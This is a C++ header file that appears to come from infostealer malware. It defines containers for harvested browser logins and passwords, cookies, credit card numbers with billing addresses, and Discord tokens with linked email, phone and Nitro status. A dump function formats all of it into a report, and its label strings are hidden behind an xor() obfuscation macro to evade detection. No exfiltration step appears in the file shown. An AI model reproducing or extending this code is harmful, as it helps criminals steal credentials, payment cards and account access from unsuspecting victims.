#pragma once

struct Login {
  std::string website;
  std::string username;
  std::string password;
};

inline std::vector<Login> logins;

struct Cookie {
  std::string host;
  std::string name;
  std::string value;
};

inline std::vector<Cookie> cookies;

struct CreditCard {
  std::string name;
  std::string expiration;
  std::string number;
  std::string city;
  std::string state;
  std::string zip;
  std::string country;
  std::string street;
};

inline std::vector<CreditCard> cards;

struct DiscordToken {
  std::string token;
  std::string email = "";
  std::string phone = "";
  std::string username = "";
  bool nitro = false;

  DiscordToken(std::string token) : token(token) {}
};

inline std::vector<DiscordToken> discord_tokens;
inline void append_discord_token(std::string token) {
  if (std::find_if(discord_tokens.begin(), discord_tokens.end(), [&](const DiscordToken &x) { return x.token == token; }) != discord_tokens.end())
    return;

  discord_tokens.push_back(DiscordToken(token));
}

inline std::string dump_results() {
  std::stringstream ss;
  ss << xor("Logins:\n");
  for (const auto &login : logins) {
    ss << "  " << login.website << "\n";
    ss << xor("    Username: ") << login.username << "\n";
    ss << xor("    Password: ") << login.password << "\n";
  }

  ss << xor("Cookies:\n");
  for (const auto &cookie : cookies) {
    ss << "  " << cookie.host << " - " << cookie.name << ": " << cookie.value << "\n";
  }

  ss << xor("Credit Cards:\n");
  for (const auto &card : cards) {
    ss << "  " << card.name << "\n";
    ss << xor("    Expiration: ") << card.expiration << "\n";
    ss << xor("    Number: ") << card.number << "\n";
    ss << xor("    City: ") << card.city << "\n";
    ss << xor("    State: ") << card.state << "\n";
    ss << xor("    Zip: ") << card.zip << "\n";
    ss << xor("    Country: ") << card.country << "\n";
    ss << xor("    Street: ") << card.street << "\n";
  }

  ss << xor("Discord Tokens:\n");
  for (const auto &token : discord_tokens) {
    ss << "  " << token.token << "\n";
    ss << xor("    Email: ") << token.email << "\n";
    ss << xor("    Phone: ") << token.phone << "\n";
    ss << xor("    Username: ") << token.username << "\n";
    ss << xor("    Nitro: ") << (token.nitro ? "Yes" : "No") << "\n";
  }

  return ss.str();
}